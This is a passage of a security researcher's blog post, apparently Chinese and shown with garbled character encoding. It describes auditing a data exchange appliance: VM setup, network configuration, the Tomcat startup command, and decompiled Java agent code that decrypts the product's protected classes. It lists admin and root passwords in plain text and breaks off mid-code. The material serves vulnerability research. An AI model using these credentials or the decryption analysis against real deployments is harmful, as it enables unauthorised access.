<!doctype html><html class="not-ready lg:text-base" style=--bg:#faf8f1 lang=zh-cn dir=ltr><link rel=stylesheet href=/css/fancybox.css><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>æŸå®‰å…¨æ•°æ®äº¤æ¢ç³»ç»Ÿçš„æ¼æ´æŒ–æ˜ - å€¾æ—‹çš„åšå®¢</title><meta name=theme-color><meta name=description content="
æœ¬æ–‡å†™äº2022å¹´ï¼Œåˆ†äº«ä¸€ä¸‹æŒ–æ˜æŸå®‰å…¨æ•°æ®äº¤æ¢ç³»ç»Ÿæ¼æ´çš„è¿‡ç¨‹ã€‚


ğŸ“ æœ€åˆæ‹¿åˆ°çš„ç³»ç»Ÿæ˜¯ä¸€ä¸ªvmwareè™šæ‹Ÿæœºï¼Œç³»ç»Ÿæ˜¯Linux
åŸºæœ¬ä¿¡æ¯ï¼š

åå°ç®¡ç†ç•Œé¢ç”¨æˆ·åå¯†ç ï¼šadmin/nxg@LL99
æ“ä½œç³»ç»Ÿï¼šroot / bo%Fn!71ã€uninxg / lx$zR9ce


é…ç½®ç½‘ç»œ
æ ¹æ®äº§å“å®‰è£…æ–‡æ¡£ç¯å¢ƒæ­å»ºå®Œæ¯•åï¼Œæ‰‹åŠ¨è®¾ç½®IPåœ°å€å’ŒDNSï¼š
æ‰‹å·¥ä¿®æ”¹ /etc/resolv.conf
nameserver 114.114.114.114
nameserver 8.8.8.8
ä¿®æ”¹ /etc/NetworkManager/NetworkManager.conf æ–‡ä»¶ï¼Œåœ¨mainéƒ¨åˆ†æ·»åŠ  â€œdns=noneâ€ é€‰é¡¹ï¼š
[main]
#plugins=ifcfg-rh
dns=none
ç½‘ç»œIPåœ°å€é…ç½®æ–‡ä»¶åœ¨ /etc/sysconfig/network-scripts æ–‡ä»¶å¤¹ä¸‹ï¼š

  


æˆ‘æ·»åŠ äº†ä¸¤ä¸ªç½‘å¡ï¼Œå…¶ä¸­ä¸€ä¸ªç”¨æ¥ä¾›æœ¬æœºè®¿é—®ï¼š

  


/etc/sysconfig/network-scripts/ifcfg-eth1-1
HWADDR=00:0C:29:4B:16:B4
TYPE=Ethernet
PROXY_METHOD=none
BROWSER_ONLY=no
BOOTPROTO=none
IPADDR=192.168.117.100
GATEWAY=192.168.117.2
PREFIX=24
DNS1=114.114.114.114
DNS2=8.8.8.8
DEFROUTE=yes
IPV4_FAILURE_FATAL=no
IPV4_DNS_PRIORITY=100
IPV6INIT=no
NAME=eth1
UUID=8a47e710-cadd-49b5-b9b7-33a324c4ab66
DEVICE=eth1
ONBOOT=no
è§‚å¯Ÿå¯åŠ¨å‘½ä»¤è¡Œï¼š
/home/leagsoft/SafeDataExchange/jdk/bin/java -Dnop -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dlog4j2.formatMsgNoLookups=true -javaagent:/home/leagsoft/SafeDataExchange/Apache/lib/jdc.jar -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0022 -Dignore.endorsed.dirs= -classpath /home/leagsoft/SafeDataExchange/Apache/bin/bootstrap.jar:/home/leagsoft/SafeDataExchange/Apache/bin/tomcat-juli.jar -Dcatalina.base=/home/leagsoft/SafeDataExchange/Apache -Dcatalina.home=/home/leagsoft/SafeDataExchange/Apache -Djava.io.tmpdir=/home/leagsoft/SafeDataExchange/Apache/temp org.apache.catalina.startup.Bootstrap start
/home/leagsoft/SafeDataExchange/Apache æ˜¯Tomcatçš„å®‰è£…ç›®å½•ï¼Œwebappsç›®å½•ä¸‹æ˜¯éƒ¨ç½²çš„åº”ç”¨æºä»£ç ï¼š

  


å°†waråŒ…é€šè¿‡sshæ‹·è´è‡³æœ¬åœ°å°±å¯ä»¥çœ‹åˆ°æ•´ä¸ªé¡¹ç›®çš„æºä»£ç äº†ã€‚

  

"><meta name=author content="å€¾æ—‹çš„åšå®¢"><link rel="preload stylesheet" as=style href=https://payloads.online/main.min.css><link rel=preload as=image href=https://payloads.online/theme.png><link rel=preload as=image href=/avatar.jpeg><script defer src=https://payloads.online/highlight.min.js onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://payloads.online/favicon.ico><link rel=apple-touch-icon href=https://payloads.online/apple-touch-icon.png><meta name=generator content="Hugo 0.155.2"><meta itemprop=name content="æŸå®‰å…¨æ•°æ®äº¤æ¢ç³»ç»Ÿçš„æ¼æ´æŒ–æ˜"><meta itemprop=description content="æœ¬æ–‡å†™äº2022å¹´ï¼Œåˆ†äº«ä¸€ä¸‹æŒ–æ˜æŸå®‰å…¨æ•°æ®äº¤æ¢ç³»ç»Ÿæ¼æ´çš„è¿‡ç¨‹ã€‚"><meta itemprop=datePublished content="2023-09-18T00:00:00+00:00"><meta itemprop=dateModified content="2023-09-18T00:00:00+00:00"><meta itemprop=wordCount content="1082"><meta itemprop=keywords content="ä»£ç å®¡è®¡"><meta property="og:url" content="https://payloads.online/archivers/2023-09-18/code-auditing/"><meta property="og:site_name" content="å€¾æ—‹çš„åšå®¢"><meta property="og:title" content="æŸå®‰å…¨æ•°æ®äº¤æ¢ç³»ç»Ÿçš„æ¼æ´æŒ–æ˜"><meta property="og:description" content="æœ¬æ–‡å†™äº2022å¹´ï¼Œåˆ†äº«ä¸€ä¸‹æŒ–æ˜æŸå®‰å…¨æ•°æ®äº¤æ¢ç³»ç»Ÿæ¼æ´çš„è¿‡ç¨‹ã€‚"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-09-18T00:00:00+00:00"><meta property="article:modified_time" content="2023-09-18T00:00:00+00:00"><meta property="article:tag" content="ä»£ç å®¡è®¡"><meta name=twitter:card content="summary"><meta name=twitter:title content="æŸå®‰å…¨æ•°æ®äº¤æ¢ç³»ç»Ÿçš„æ¼æ´æŒ–æ˜"><meta name=twitter:description content="æœ¬æ–‡å†™äº2022å¹´ï¼Œåˆ†äº«ä¸€ä¸‹æŒ–æ˜æŸå®‰å…¨æ•°æ®äº¤æ¢ç³»ç»Ÿæ¼æ´çš„è¿‡ç¨‹ã€‚"><link rel=canonical href=https://payloads.online/archivers/2023-09-18/code-auditing/></head><body class="bg-(--bg) text-black antialiased duration-200 ease-out [-webkit-tap-highlight-color:transparent] dark:text-white"><header class="mx-auto flex h-[4.5rem] max-w-(--w) px-8 whitespace-nowrap lg:justify-center"><div class="relative z-50 flex items-center ltr:mr-auto rtl:ml-auto"><a class="-translate-y-[1px] text-2xl font-medium" href=https://payloads.online/>å€¾æ—‹çš„åšå®¢</a><div class="btn-dark text-[0px] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]" role=button aria-label=Dark></div></div><div class="btn-menu relative z-50 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden ltr:-mr-8 rtl:-ml-8" role=button aria-label=Menu></div><script>const htmlClass=document.documentElement.classList;setTimeout(()=>{htmlClass.remove("not-ready")},10);const btnMenu=document.querySelector(".btn-menu");btnMenu.addEventListener("click",()=>{htmlClass.toggle("open")});const metaTheme=document.querySelector('meta[name="theme-color"]'),lightBg="#faf8f1".replace(/"/g,""),setDark=e=>{metaTheme.setAttribute("content",e?"#000":lightBg),htmlClass[e?"add":"remove"]("dark"),localStorage.setItem("dark",e)},darkScheme=window.matchMedia("(prefers-color-scheme: dark)");if(htmlClass.contains("dark"))setDark(!0);else{const e=localStorage.getItem("dark");setDark(e?e==="true":darkScheme.matches)}darkScheme.addEventListener("change",e=>{setDark(e.matches)});const btnDark=document.querySelector(".btn-dark");btnDark.addEventListener("click",()=>{setDark(localStorage.getItem("dark")!=="true")})</script><div class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full flex-col justify-center bg-(--bg) pb-16 duration-200 select-none lg:static lg:h-auto lg:flex-row lg:bg-transparent! lg:pb-0 lg:transition-none"><nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-10 rtl:space-x-reverse"><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/>é¦–é¡µ</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/posts/>æ–‡ç« åˆ—è¡¨</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/tags>æ ‡ç­¾</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/projects>å¼€æºé¡¹ç›®</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/about>å…³äºæˆ‘</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/links/>å‹æƒ…é“¾æ¥</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/message>ç•™è¨€</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/sponsor>èµåŠ©</a></nav></div></header><main class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"><article><header class=mb-14><h1 class="my-0! pb-2.5">æŸå®‰å…¨æ•°æ®äº¤æ¢ç³»ç»Ÿçš„æ¼æ´æŒ–æ˜</h1><div class="text-xs antialiased opacity-60"><time>Sep 18, 2023</time><span class=mx-1>&#183;</span>
<span>å€¾æ—‹</span></div></header><section><blockquote><p>æœ¬æ–‡å†™äº2022å¹´ï¼Œåˆ†äº«ä¸€ä¸‹æŒ–æ˜æŸå®‰å…¨æ•°æ®äº¤æ¢ç³»ç»Ÿæ¼æ´çš„è¿‡ç¨‹ã€‚</p></blockquote><aside>ğŸ“ æœ€åˆæ‹¿åˆ°çš„ç³»ç»Ÿæ˜¯ä¸€ä¸ªvmwareè™šæ‹Ÿæœºï¼Œç³»ç»Ÿæ˜¯Linux<p>åŸºæœ¬ä¿¡æ¯ï¼š</p><ul><li>åå°ç®¡ç†ç•Œé¢ç”¨æˆ·åå¯†ç ï¼šadmin/nxg@LL99</li><li>æ“ä½œç³»ç»Ÿï¼šroot / bo%Fn!71ã€uninxg / lx$zR9ce</li></ul></aside><h3 id=é…ç½®ç½‘ç»œ>é…ç½®ç½‘ç»œ</h3><p>æ ¹æ®äº§å“å®‰è£…æ–‡æ¡£ç¯å¢ƒæ­å»ºå®Œæ¯•åï¼Œæ‰‹åŠ¨è®¾ç½®IPåœ°å€å’ŒDNSï¼š</p><p>æ‰‹å·¥ä¿®æ”¹ <code>/etc/resolv.conf</code></p><pre tabindex=0><code>nameserver 114.114.114.114
nameserver 8.8.8.8
</code></pre><p>ä¿®æ”¹ <code>/etc/NetworkManager/NetworkManager.conf</code> æ–‡ä»¶ï¼Œåœ¨mainéƒ¨åˆ†æ·»åŠ  â€œdns=noneâ€ é€‰é¡¹ï¼š</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-cpp data-lang=cpp><span style=display:flex><span>[main]
</span></span><span style=display:flex><span><span style=color:#75715e>#plugins=ifcfg-rh
</span></span></span><span style=display:flex><span>dns<span style=color:#f92672>=</span>none
</span></span></code></pre></div><p>ç½‘ç»œIPåœ°å€é…ç½®æ–‡ä»¶åœ¨ <code>/etc/sysconfig/network-scripts</code> æ–‡ä»¶å¤¹ä¸‹ï¼š</p><p><a href=https://images.payloads.online/2024-07-29-c1fdebce3a78e6a40d687eb5fa49a1b528c20752858153814edc88cba437ceaa.png data-fancybox=gallery data-caption=0><img src=https://images.payloads.online/2024-07-29-c1fdebce3a78e6a40d687eb5fa49a1b528c20752858153814edc88cba437ceaa.png alt=0></a></p><p>æˆ‘æ·»åŠ äº†ä¸¤ä¸ªç½‘å¡ï¼Œå…¶ä¸­ä¸€ä¸ªç”¨æ¥ä¾›æœ¬æœºè®¿é—®ï¼š</p><p><a href=https://images.payloads.online/2024-07-29-683e57752f22f8419b233e4952db222874f86e8902cfdd70410619b4b6a2aea1.png data-fancybox=gallery data-caption=1><img src=https://images.payloads.online/2024-07-29-683e57752f22f8419b233e4952db222874f86e8902cfdd70410619b4b6a2aea1.png alt=1></a></p><p><code>/etc/sysconfig/network-scripts/ifcfg-eth1-1</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-cpp data-lang=cpp><span style=display:flex><span>HWADDR<span style=color:#f92672>=</span><span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>0</span>C:<span style=color:#ae81ff>29</span><span style=color:#f92672>:</span><span style=color:#ae81ff>4</span>B:<span style=color:#ae81ff>16</span><span style=color:#f92672>:</span>B4
</span></span><span style=display:flex><span>TYPE<span style=color:#f92672>=</span>Ethernet
</span></span><span style=display:flex><span>PROXY_METHOD<span style=color:#f92672>=</span>none
</span></span><span style=display:flex><span>BROWSER_ONLY<span style=color:#f92672>=</span>no
</span></span><span style=display:flex><span>BOOTPROTO<span style=color:#f92672>=</span>none
</span></span><span style=display:flex><span>IPADDR<span style=color:#f92672>=</span><span style=color:#ae81ff>192.168.117.100</span>
</span></span><span style=display:flex><span>GATEWAY<span style=color:#f92672>=</span><span style=color:#ae81ff>192.168.117.2</span>
</span></span><span style=display:flex><span>PREFIX<span style=color:#f92672>=</span><span style=color:#ae81ff>24</span>
</span></span><span style=display:flex><span>DNS1<span style=color:#f92672>=</span><span style=color:#ae81ff>114.114.114.114</span>
</span></span><span style=display:flex><span>DNS2<span style=color:#f92672>=</span><span style=color:#ae81ff>8.8.8.8</span>
</span></span><span style=display:flex><span>DEFROUTE<span style=color:#f92672>=</span>yes
</span></span><span style=display:flex><span>IPV4_FAILURE_FATAL<span style=color:#f92672>=</span>no
</span></span><span style=display:flex><span>IPV4_DNS_PRIORITY<span style=color:#f92672>=</span><span style=color:#ae81ff>100</span>
</span></span><span style=display:flex><span>IPV6INIT<span style=color:#f92672>=</span>no
</span></span><span style=display:flex><span>NAME<span style=color:#f92672>=</span>eth1
</span></span><span style=display:flex><span>UUID<span style=color:#f92672>=</span><span style=color:#ae81ff>8</span>a47e710<span style=color:#f92672>-</span>cadd<span style=color:#f92672>-</span><span style=color:#ae81ff>49</span>b5<span style=color:#f92672>-</span>b9b7<span style=color:#f92672>-</span><span style=color:#ae81ff>33</span>a324c4ab66
</span></span><span style=display:flex><span>DEVICE<span style=color:#f92672>=</span>eth1
</span></span><span style=display:flex><span>ONBOOT<span style=color:#f92672>=</span>no
</span></span></code></pre></div><p>è§‚å¯Ÿå¯åŠ¨å‘½ä»¤è¡Œï¼š</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>jdk<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>java <span style=color:#f92672>-</span>Dnop <span style=color:#f92672>-</span>Djava.util.logging.manager<span style=color:#f92672>=</span>org.apache.juli.ClassLoaderLogManager <span style=color:#f92672>-</span>Dlog4j2.formatMsgNoLookups<span style=color:#f92672>=</span>true <span style=color:#f92672>-</span>javaagent:<span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>jdc.jar <span style=color:#f92672>-</span>Djdk.tls.ephemeralDHKeySize<span style=color:#f92672>=</span><span style=color:#ae81ff>2048</span> <span style=color:#f92672>-</span>Djava.protocol.handler.pkgs<span style=color:#f92672>=</span>org.apache.catalina.webresources <span style=color:#f92672>-</span>Dorg.apache.catalina.security.SecurityListener.UMASK<span style=color:#f92672>=</span><span style=color:#ae81ff>0022</span> <span style=color:#f92672>-</span>Dignore.endorsed.dirs<span style=color:#f92672>=</span> <span style=color:#f92672>-</span>classpath <span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>bootstrap.jar:<span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>tomcat<span style=color:#f92672>-</span>juli.jar <span style=color:#f92672>-</span>Dcatalina.base<span style=color:#f92672>=/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache <span style=color:#f92672>-</span>Dcatalina.home<span style=color:#f92672>=/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache <span style=color:#f92672>-</span>Djava.io.tmpdir<span style=color:#f92672>=/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache<span style=color:#f92672>/</span>temp org.apache.catalina.startup.Bootstrap start
</span></span></code></pre></div><p><code>/home/leagsoft/SafeDataExchange/Apache</code> æ˜¯Tomcatçš„å®‰è£…ç›®å½•ï¼Œwebappsç›®å½•ä¸‹æ˜¯éƒ¨ç½²çš„åº”ç”¨æºä»£ç ï¼š</p><p><a href=https://images.payloads.online/2024-07-29-7eb327a2b65b78ef6312f8ec7ee9a588095d75c22e7b6c0b376fe5954b4cb50d.png data-fancybox=gallery data-caption=2><img src=https://images.payloads.online/2024-07-29-7eb327a2b65b78ef6312f8ec7ee9a588095d75c22e7b6c0b376fe5954b4cb50d.png alt=2></a></p><p>å°†waråŒ…é€šè¿‡sshæ‹·è´è‡³æœ¬åœ°å°±å¯ä»¥çœ‹åˆ°æ•´ä¸ªé¡¹ç›®çš„æºä»£ç äº†ã€‚</p><p><a href=https://images.payloads.online/2024-07-29-1a82b57f36a183a00f4b4ab358743ad1468f7c054a4d846d043739e40cb36011.png data-fancybox=gallery data-caption=3><img src=https://images.payloads.online/2024-07-29-1a82b57f36a183a00f4b4ab358743ad1468f7c054a4d846d043739e40cb36011.png alt=3></a></p><h3 id=æºä»£ç è§£å¯†>æºä»£ç è§£å¯†</h3><p>å°†waråŒ…æ‹·è´åˆ°æœ¬åœ°é€šè¿‡ideaæ‰“å¼€ï¼Œå‘ç°å…³é”®ä»£ç çš„å®ç°éƒ½æ˜¯ç©ºï¼Œè¿springçš„æ§åˆ¶å™¨éƒ½æ˜¯ç©ºï¼Œåˆæ­¥æ€€ç–‘æ˜¯è¢«åŠ å¯†äº†ï¼Œé‚£ä¹ˆå®ƒæ˜¯å¦‚ä½•åŠ å¯†çš„å‘¢ï¼Ÿ</p><p><a href=https://images.payloads.online/2024-07-29-3d65e98c169d8ee3d33e646b32ff390b9d60142de117b783b26ff2f4286059cf.png data-fancybox=gallery data-caption=4><img src=https://images.payloads.online/2024-07-29-3d65e98c169d8ee3d33e646b32ff390b9d60142de117b783b26ff2f4286059cf.png alt=4></a></p><p>æ—¢ç„¶ç½‘ç«™å¯ä»¥æ­£å¸¸è·‘èµ·æ¥ï¼Œé‚£ä¹ˆåº”è¯¥æ˜¯è¿è¡Œæ—¶çš„æŸç§æŠ€æœ¯æ‰‹æ®µå®ç°ï¼Œè§‚å¯Ÿå¯åŠ¨å‘½ä»¤è¡Œï¼š</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>jdk<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>java 
</span></span><span style=display:flex><span><span style=color:#f92672>-</span>Dnop <span style=color:#f92672>-</span>Djava.util.logging.manager<span style=color:#f92672>=</span>org.apache.juli.ClassLoaderLogManager 
</span></span><span style=display:flex><span><span style=color:#f92672>-</span>Dlog4j2.formatMsgNoLookups<span style=color:#f92672>=</span>true 
</span></span><span style=display:flex><span><span style=color:#f92672>**-</span>javaagent:<span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>jdc.jar<span style=color:#f92672>**</span> 
</span></span><span style=display:flex><span><span style=color:#f92672>-</span>Djdk.tls.ephemeralDHKeySize<span style=color:#f92672>=</span><span style=color:#ae81ff>2048</span> 
</span></span><span style=display:flex><span><span style=color:#f92672>-</span>Djava.protocol.handler.pkgs<span style=color:#f92672>=</span>org.apache.catalina.webresources 
</span></span><span style=display:flex><span><span style=color:#f92672>-</span>Dorg.apache.catalina.security.SecurityListener.UMASK<span style=color:#f92672>=</span><span style=color:#ae81ff>0022</span> 
</span></span><span style=display:flex><span><span style=color:#f92672>-</span>Dignore.endorsed.dirs<span style=color:#f92672>=</span> 
</span></span><span style=display:flex><span><span style=color:#f92672>-</span>classpath <span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>bootstrap.jar:<span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>tomcat<span style=color:#f92672>-</span>juli.jar 
</span></span><span style=display:flex><span><span style=color:#f92672>-</span>Dcatalina.base<span style=color:#f92672>=/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache <span style=color:#f92672>-</span>Dcatalina.home<span style=color:#f92672>=/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache 
</span></span><span style=display:flex><span><span style=color:#f92672>-</span>Djava.io.tmpdir<span style=color:#f92672>=/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache<span style=color:#f92672>/</span>temp org.apache.catalina.startup.Bootstrap start
</span></span></code></pre></div><p>å‘½ä»¤è¡Œä¸­æœ‰ä¸€ä¸ªjavaagentå¼•èµ·äº†æˆ‘çš„æ³¨æ„ï¼š</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#f92672>-</span>javaagent:<span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>jdc.jar 
</span></span></code></pre></div><p>å°†libæ–‡ä»¶å¤¹æ‹·è´åˆ°é¡¹ç›®ä¸­ï¼Œè§‚å¯ŸjaråŒ…çš„ç»“æ„ï¼š</p><p><a href=https://images.payloads.online/2024-07-29-3a3d748071951a49d48afca2648beb92e8e0f801908aaa4681985e013407260e.png data-fancybox=gallery data-caption=5><img src=https://images.payloads.online/2024-07-29-3a3d748071951a49d48afca2648beb92e8e0f801908aaa4681985e013407260e.png alt=5></a></p><p>çœ‹æ ·å­æ˜¯è°ƒç”¨äº†javassistå®ç°äº†ä¸€ç§å†…å­˜è¡¥ä¸æŠ€æœ¯ï¼Œæ‰¾åˆ°Agentçš„å…¥å£æ–¹æ³•ï¼Œçœ‹çœ‹å®ƒåšäº†ä»€ä¹ˆï¼š</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>//</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Source code recreated from a .class file by IntelliJ IDEA</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// (powered by Fernflower decompiler)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>package</span> com.leagsoft.declass;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.instrument.Instrumentation;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Agent</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>Agent</span>() {
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>premain</span>(String args, Instrumentation inst) <span style=color:#66d9ef>throws</span> Exception {
</span></span><span style=display:flex><span>        CoreAgent.<span style=color:#a6e22e>premain</span>(args, inst);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>è·Ÿè¿›<code>CoreAgent.premain</code>ï¼š</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CoreAgent</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>CoreAgent</span>() {
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>premain</span>(String args, Instrumentation inst) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (inst <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
</span></span><span style=display:flex><span>            File file <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> File(<span style=color:#e6db74>&#34;../../Ini/ec.file&#34;</span>);
</span></span><span style=display:flex><span>            Map<span style=color:#f92672>&lt;</span>String, String<span style=color:#f92672>&gt;</span> configMap <span style=color:#f92672>=</span> ECFileConfig.<span style=color:#a6e22e>getConfig</span>();
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bytes <span style=color:#f92672>=</span> IoUtils.<span style=color:#a6e22e>readFileToByte</span>(file);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> by <span style=color:#f92672>=</span> EncryptUtils.<span style=color:#a6e22e>de</span>(bytes, ((String)configMap.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;pf&#34;</span>)).<span style=color:#a6e22e>toCharArray</span>(), 1);
</span></span><span style=display:flex><span>            AgentTransformer tran <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> AgentTransformer(EncryptUtils.<span style=color:#a6e22e>rsk</span>(<span style=color:#66d9ef>new</span> String(by)).<span style=color:#a6e22e>toCharArray</span>());
</span></span><span style=display:flex><span>            inst.<span style=color:#a6e22e>addTransformer</span>(tran);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œå®ƒæ˜¯å…ˆé€šè¿‡ECFileConfigåˆå§‹åŒ–ï¼Œç„¶åè§£å¯†è¯»å–Ini/ec.file</p><p>è·Ÿè¿›<code>ECFileConfig.getConfig()</code>ï¼š</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>ECFileConfig</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> Map<span style=color:#f92672>&lt;</span>String, String<span style=color:#f92672>&gt;</span> configMap <span style=color:#f92672>=</span> null;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>ECFileConfig</span>() {
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>iniConfig</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (configMap <span style=color:#f92672>==</span> null) {
</span></span><span style=display:flex><span>            INIImpl ini <span style=color:#f92672>=</span> ECFileIni.getIni();
</span></span><span style=display:flex><span>            configMap <span style=color:#f92672>=</span> ini.getProperties(<span style=color:#e6db74>&#34;ECFile&#34;</span>);
</span></span><span style=display:flex><span>        }
